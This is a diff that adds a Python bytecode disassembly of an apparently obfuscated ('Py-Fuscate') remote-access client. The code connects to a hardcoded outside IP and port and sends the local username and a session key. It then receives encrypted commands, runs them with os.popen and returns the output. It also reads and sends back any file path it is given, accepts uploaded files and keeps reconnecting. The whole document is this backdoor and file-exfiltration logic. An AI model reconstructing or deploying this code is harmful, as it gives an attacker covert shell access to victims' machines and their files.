@@ -1,0 +1,752 @@
+     RESUME                   0
+
+     NOP
+
+L1:     NOP
+
+L2:     LOAD_CONST               0 (None)
+
+     STORE_FAST               2 (message)
+
+     LOAD_FAST                0 (client)
+
+     LOAD_ATTR                1 (recv + NULL|self)
+
+     LOAD_CONST               1 (1024)
+
+     CALL                     1
+
+     STORE_FAST               3 (msg)
+
+     LOAD_GLOBAL              3 (dec_mes + NULL)
+
+     LOAD_FAST_LOAD_FAST     49 (msg, k)
+
+     CALL                     2
+
+     STORE_FAST               3 (msg)
+
+     LOAD_FAST                3 (msg)
+
+     LOAD_ATTR                5 (decode + NULL|self)
+
+     CALL                     0
+
+     STORE_FAST               2 (message)
+
+     LOAD_FAST                3 (msg)
+
+     LOAD_CONST               2 (b'')
+
+     COMPARE_OP              88 (bool(==))
+
+     POP_JUMP_IF_FALSE       79 (to L7)
+
+     LOAD_GLOBAL              6 (time)
+
+     LOAD_ATTR                8 (sleep)
+
+     PUSH_NULL
+
+     LOAD_CONST               3 (10)
+
+     CALL                     1
+
+     POP_TOP
+
+     LOAD_CONST               4 (0)
+
+     STORE_FAST               4 (s)
+
+     LOAD_FAST                3 (msg)
+
+     LOAD_CONST               2 (b'')
+
+     COMPARE_OP              88 (bool(==))
+
+     POP_JUMP_IF_FALSE       47 (to L6)
+
+L3:     LOAD_FAST                4 (s)
+
+     LOAD_CONST               5 (1)
+
+     BINARY_OP               13 (+=)
+
+     STORE_FAST               4 (s)
+
+     LOAD_FAST                0 (client)
+
+     LOAD_ATTR                1 (recv + NULL|self)
+
+     LOAD_CONST               1 (1024)
+
+     CALL                     1
+
+     STORE_FAST               3 (msg)
+
+     LOAD_FAST                4 (s)
+
+     LOAD_CONST               6 (300)
+
+     COMPARE_OP              88 (bool(==))
+
+     POP_JUMP_IF_FALSE       11 (to L4)
+
+     LOAD_GLOBAL             11 (Exception + NULL)
+
+     LOAD_CONST               7 ('Reconnect!')
+
+     CALL                     1
+
+     RAISE_VARARGS            1
+
+L4:     LOAD_FAST                3 (msg)
+
+     LOAD_CONST               2 (b'')
+
+     COMPARE_OP              88 (bool(==))
+
+     POP_JUMP_IF_FALSE        2 (to L6)
+
+L5:     JUMP_BACKWARD           47 (to L3)
+
+L6:     EXTENDED_ARG             1
+
+     JUMP_FORWARD           510 (to L23)
+
+L7:     LOAD_FAST                2 (message)
+
+     LOAD_CONST               8 ('check')
+
+     COMPARE_OP              88 (bool(==))
+
+     POP_JUMP_IF_FALSE       31 (to L9)
+
+     LOAD_GLOBAL             13 (enc_mes + NULL)
+
+     LOAD_CONST               9 ('check-ok')
+
+     LOAD_FAST                1 (k)
+
+     CALL                     2
+
+     STORE_FAST               5 (enc_answ)
+
+     LOAD_FAST                0 (client)
+
+     LOAD_ATTR               15 (send + NULL|self)
+
+     LOAD_FAST                5 (enc_answ)
+
+     CALL                     1
+
+     POP_TOP
+
+L8:     EXTENDED_ARG             1
+
+     JUMP_FORWARD           473 (to L23)
+
+L9:     LOAD_FAST                2 (message)
+
+     LOAD_CONST              10 ('send_file')
+
+     COMPARE_OP              88 (bool(==))
+
+     POP_JUMP_IF_FALSE       42 (to L11)
+
+     LOAD_GLOBAL             16 (threading)
+
+     LOAD_ATTR               18 (Thread)
+
+     PUSH_NULL
+
+     LOAD_GLOBAL             20 (receive_file)
+
+     LOAD_CONST              11 (('target',))
+
+     CALL_KW                  1
+
+     STORE_FAST               6 (receive_file_thread)
+
+     LOAD_FAST                6 (receive_file_thread)
+
+     LOAD_ATTR               23 (start + NULL|self)
+
+     CALL                     0
+
+     POP_TOP
+
+L10:     EXTENDED_ARG             1
+
+     JUMP_FORWARD           425 (to L23)
+
+L11:     LOAD_FAST                2 (message)
+
+     LOAD_CONST              12 ('get_file')
+
+     COMPARE_OP              88 (bool(==))
+
+     POP_JUMP_IF_FALSE      195 (to L18)
+
+     LOAD_GLOBAL             13 (enc_mes + NULL)
+
+     LOAD_CONST              13 ('ok')
+
+     LOAD_FAST                1 (k)
+
+     CALL                     2
+
+     STORE_FAST               7 (okenc)
+
+     LOAD_FAST                0 (client)
+
+     LOAD_ATTR               15 (send + NULL|self)
+
+     LOAD_FAST                7 (okenc)
+
+     CALL                     1
+
+     POP_TOP
+
+     NOP
+
+L12:     NOP
+
+L13:     LOAD_FAST                0 (client)
+
+     LOAD_ATTR                1 (recv + NULL|self)
+
+     LOAD_CONST               1 (1024)
+
+     CALL                     1
+
+     STORE_FAST               8 (path_to_file)
+
+     LOAD_GLOBAL              3 (dec_mes + NULL)
+
+     LOAD_FAST_LOAD_FAST    129 (path_to_file, k)
+
+     CALL                     2
+
+     STORE_FAST               8 (path_to_file)
+
+     LOAD_GLOBAL             25 (open + NULL)
+
+     LOAD_FAST                8 (path_to_file)
+
+     LOAD_CONST              14 ('rb')
+
+     CALL                     2
+
+     BEFORE_WITH
+
+L14:     STORE_FAST               9 (f)
+
+     LOAD_FAST                9 (f)
+
+     LOAD_ATTR               27 (read + NULL|self)
+
+     CALL                     0
+
+     STORE_FAST              10 (bytes_read)
+
+L15:     LOAD_CONST               0 (None)
+
+     LOAD_CONST               0 (None)
+
+     LOAD_CONST               0 (None)
+
+     CALL                     2
+
+     POP_TOP
+
+L16:     LOAD_GLOBAL             13 (enc_mes + NULL)
+
+     LOAD_FAST_CHECK         10 (bytes_read)
+
+     LOAD_FAST                1 (k)
+
+     CALL                     2
+
+     STORE_FAST              11 (bytes_enc)
+
+     LOAD_GLOBAL             29 (len + NULL)
+
+     LOAD_FAST               11 (bytes_enc)
+
+     CALL                     1
+
+     STORE_FAST              12 (filesize)
+
+     LOAD_GLOBAL             13 (enc_mes + NULL)
+
+     LOAD_FAST               12 (filesize)
+
+     FORMAT_SIMPLE
+
+     LOAD_FAST                1 (k)
+
+     CALL                     2
+
+     STORE_FAST              12 (filesize)
+
+     LOAD_FAST                0 (client)
+
+     LOAD_ATTR               15 (send + NULL|self)
+
+     LOAD_FAST               12 (filesize)
+
+     CALL                     1
+
+     POP_TOP
+
+     LOAD_FAST                0 (client)
+
+     LOAD_ATTR                1 (recv + NULL|self)
+
+     LOAD_CONST               1 (1024)
+
+     CALL                     1
+
+     STORE_FAST              13 (vsb)
+
+     LOAD_GLOBAL              3 (dec_mes + NULL)
+
+     LOAD_FAST_LOAD_FAST    209 (vsb, k)
+
+     CALL                     2
+
+     STORE_FAST              13 (vsb)
+
+     LOAD_FAST                0 (client)
+
+     LOAD_ATTR               31 (sendall + NULL|self)
+
+     LOAD_FAST               11 (bytes_enc)
+
+     CALL                     1
+
+     POP_TOP
+
+L17:     JUMP_FORWARD           224 (to L23)
+
+L18:     LOAD_FAST                2 (message)
+
+     LOAD_CONST               0 (None)
+
+     COMPARE_OP             119 (bool(!=))
+
+     POP_JUMP_IF_FALSE      218 (to L23)
+
+     LOAD_FAST                2 (message)
+
+     LOAD_CONST              17 ('')
+
+     COMPARE_OP             119 (bool(!=))
+
+     POP_JUMP_IF_FALSE      212 (to L23)
+
+     LOAD_FAST                2 (message)
+
+     LOAD_CONST              18 ('\n')
+
+     COMPARE_OP             119 (bool(!=))
+
+     POP_JUMP_IF_FALSE      206 (to L23)
+
+L19:     NOP
+
+L20:     LOAD_GLOBAL             34 (os)
+
+     LOAD_ATTR               36 (popen)
+
+     PUSH_NULL
+
+     LOAD_FAST                2 (message)
+
+     CALL                     1
+
+     LOAD_ATTR               27 (read + NULL|self)
+
+     CALL                     0
+
+     STORE_FAST              14 (answer)
+
+     LOAD_FAST               14 (answer)
+
+     LOAD_ATTR               33 (encode + NULL|self)
+
+     CALL                     0
+
+     LOAD_CONST               2 (b'')
+
+     COMPARE_OP              88 (bool(==))
+
+     POP_JUMP_IF_FALSE       33 (to L22)
+
+     LOAD_FAST                0 (client)
+
+     LOAD_ATTR               15 (send + NULL|self)
+
+     LOAD_CONST              19 ('Bad command!')
+
+     LOAD_ATTR               33 (encode + NULL|self)
+
+     LOAD_CONST              20 ('ascii')
+
+     CALL                     1
+
+     CALL                     1
+
+     POP_TOP
+
+L21:     JUMP_FORWARD           116 (to L23)
+
+L22:     LOAD_GLOBAL             13 (enc_mes + NULL)
+
+     LOAD_FAST_LOAD_FAST    225 (answer, k)
+
+     CALL                     2
+
+     STORE_FAST              15 (enc_answer)
+
+     LOAD_GLOBAL             39 (str + NULL)
+
+     LOAD_GLOBAL             29 (len + NULL)
+
+     LOAD_FAST               15 (enc_answer)
+
+     CALL                     1
+
+     CALL                     1
+
+     STORE_FAST              16 (size)
+
+     LOAD_FAST                0 (client)
+
+     LOAD_ATTR               15 (send + NULL|self)
+
+     LOAD_FAST               16 (size)
+
+     LOAD_ATTR               33 (encode + NULL|self)
+
+     CALL                     0
+
+     CALL                     1
+
+     POP_TOP
+
+     LOAD_FAST                0 (client)
+
+     LOAD_ATTR                1 (recv + NULL|self)
+
+     LOAD_CONST               1 (1024)
+
+     CALL                     1
+
+     LOAD_ATTR                5 (decode + NULL|self)
+
+     CALL                     0
+
+     STORE_FAST              17 (ch)
+
+     LOAD_FAST               17 (ch)
+
+     LOAD_CONST              13 ('ok')
+
+     COMPARE_OP              88 (bool(==))
+
+     POP_JUMP_IF_FALSE       17 (to L23)
+
+     LOAD_FAST                0 (client)
+
+     LOAD_ATTR               31 (sendall + NULL|self)
+
+     LOAD_FAST               15 (enc_answer)
+
+     CALL                     1
+
+     POP_TOP
+
+L23:     EXTENDED_ARG             2
+
+     JUMP_BACKWARD          645 (to L1)
+
+L24:     PUSH_EXC_INFO
+
+     WITH_EXCEPT_START
+
+     TO_BOOL
+
+     POP_JUMP_IF_TRUE         1 (to L25)
+
+     RERAISE                  2
+
+L25:     POP_TOP
+
+L26:     POP_EXCEPT
+
+     POP_TOP
+
+     POP_TOP
+
+     EXTENDED_ARG             1
+
+     JUMP_BACKWARD_NO_INTERRUPT 341 (to L16)
+
+L27:     COPY                     3
+
+     POP_EXCEPT
+
+     RERAISE                  1
+
+L28:     PUSH_EXC_INFO
+
+     POP_TOP
+
+L29:     NOP
+
+L30:     LOAD_FAST                0 (client)
+
+     LOAD_ATTR               15 (send + NULL|self)
+
+     LOAD_CONST              15 ('Error uploading file')
+
+     LOAD_ATTR               33 (encode + NULL|self)
+
+     LOAD_CONST              16 ('utf-8')
+
+     CALL                     1
+
+     CALL                     1
+
+     POP_TOP
+
+L31:     POP_EXCEPT
+
+L32:     JUMP_BACKWARD           59 (to L23)
+
+L33:     PUSH_EXC_INFO
+
+     POP_TOP
+
+L34:     POP_EXCEPT
+
+L35:     POP_EXCEPT
+
+L36:     JUMP_BACKWARD           65 (to L23)
+
+L37:     COPY                     3
+
+     POP_EXCEPT
+
+     RERAISE                  1
+
+L38:     COPY                     3
+
+     POP_EXCEPT
+
+     RERAISE                  1
+
+L39:     PUSH_EXC_INFO
+
+     POP_TOP
+
+L40:     NOP
+
+L41:     LOAD_FAST                0 (client)
+
+     LOAD_ATTR               15 (send + NULL|self)
+
+     LOAD_CONST              19 ('Bad command!')
+
+     LOAD_ATTR               33 (encode + NULL|self)
+
+     LOAD_CONST              20 ('ascii')
+
+     CALL                     1
+
+     CALL                     1
+
+     POP_TOP
+
+L42:     POP_EXCEPT
+
+L43:     JUMP_BACKWARD_NO_INTERRUPT 108 (to L23)
+
+L44:     PUSH_EXC_INFO
+
+     POP_TOP
+
+L45:     POP_EXCEPT
+
+L46:     POP_EXCEPT
+
+L47:     JUMP_BACKWARD_NO_INTERRUPT 113 (to L23)
+
+L48:     COPY                     3
+
+     POP_EXCEPT
+
+     RERAISE                  1
+
+L49:     COPY                     3
+
+     POP_EXCEPT
+
+     RERAISE                  1
+
+L50:     PUSH_EXC_INFO
+
+     POP_TOP
+
+     NOP
+
+L51:     NOP
+
+L52:     LOAD_FAST                0 (client)
+
+     LOAD_ATTR               41 (close + NULL|self)
+
+     CALL                     0
+
+     POP_TOP
+
+     LOAD_GLOBAL             42 (socket)
+
+     LOAD_ATTR               42 (socket)
+
+     PUSH_NULL
+
+     LOAD_GLOBAL             42 (socket)
+
+     LOAD_ATTR               44 (AF_INET)
+
+     LOAD_GLOBAL             42 (socket)
+
+     LOAD_ATTR               46 (SOCK_STREAM)
+
+     CALL                     2
+
+     STORE_FAST               0 (client)
+
+     LOAD_FAST                0 (client)
+
+     LOAD_ATTR               49 (connect + NULL|self)
+
+     LOAD_CONST              21 (('13.61.7.218', 55155))
+
+     CALL                     1
+
+     POP_TOP
+
+     LOAD_CONST              17 ('')
+
+     LOAD_ATTR               51 (join + NULL|self)
+
+     LOAD_CONST              22 (<code object <genexpr> at 0x7052cf4cbc90, file "Py-Fuscate", line 155>)
+
+     MAKE_FUNCTION
+
+     LOAD_GLOBAL             53 (range + NULL)
+
+     LOAD_CONST              23 (16)
+
+     CALL                     1
+
+     GET_ITER
+
+     CALL                     0
+
+     CALL                     1
+
+     STORE_FAST               1 (k)
+
+     LOAD_FAST                0 (client)
+
+     LOAD_ATTR               15 (send + NULL|self)
+
+     LOAD_GLOBAL             54 (user)
+
+     FORMAT_SIMPLE
+
+     LOAD_GLOBAL             56 (SEPARATOR)
+
+     FORMAT_SIMPLE
+
+     LOAD_FAST                1 (k)
+
+     FORMAT_SIMPLE
+
+     BUILD_STRING             3
+
+     LOAD_ATTR               33 (encode + NULL|self)
+
+     CALL                     0
+
+     CALL                     1
+
+     POP_TOP
+
+     LOAD_FAST                0 (client)
+
+     LOAD_ATTR               59 (settimeout + NULL|self)
+
+     LOAD_CONST              24 (600)
+
+     CALL                     1
+
+     POP_TOP
+
+     LOAD_GLOBAL              6 (time)
+
+     LOAD_ATTR                8 (sleep)
+
+     PUSH_NULL
+
+     LOAD_CONST              25 (60)
+
+     CALL                     1
+
+     POP_TOP
+
+L53:     POP_EXCEPT
+
+     EXTENDED_ARG             1
+
+     JUMP_BACKWARD          328 (to L23)
+
+L54:     PUSH_EXC_INFO
+
+     POP_TOP
+
+     LOAD_GLOBAL              6 (time)
+
+     LOAD_ATTR                8 (sleep)
+
+     PUSH_NULL
+
+     LOAD_CONST              25 (60)
+
+     CALL                     1
+
+     POP_TOP
+
+L55:     POP_EXCEPT
+
+     JUMP_FORWARD             3 (to L57)
+
+L56:     COPY                     3
+
+     POP_EXCEPT
+
+     RERAISE                  1
+
+L57:     JUMP_BACKWARD          237 (to L51)
+
+L58:     COPY                     3
+
+     POP_EXCEPT
+
+     RERAISE                  1
+
